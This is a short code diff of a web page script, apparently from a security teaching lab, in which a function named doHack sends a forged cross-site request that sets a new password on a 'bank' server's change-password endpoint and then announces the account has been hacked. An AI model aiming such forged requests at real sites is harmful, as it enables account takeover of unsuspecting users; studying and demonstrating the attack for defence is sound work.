@@ -6,7 +6,8 @@
     <script src="/javascripts/main.js"></script>
     <script>
         function doHack() {
-            doPost('http://bank:3002/changePasswordSOP', 'newPasswordThatOnlyHackerKnows',
+            doPost('http://bank:3002/changePasswordSOP',
+                {password: 'newPasswordThatOnlyHackerKnows'},
                 function (res) {
                     alert("Account has been hacked!");
                 }
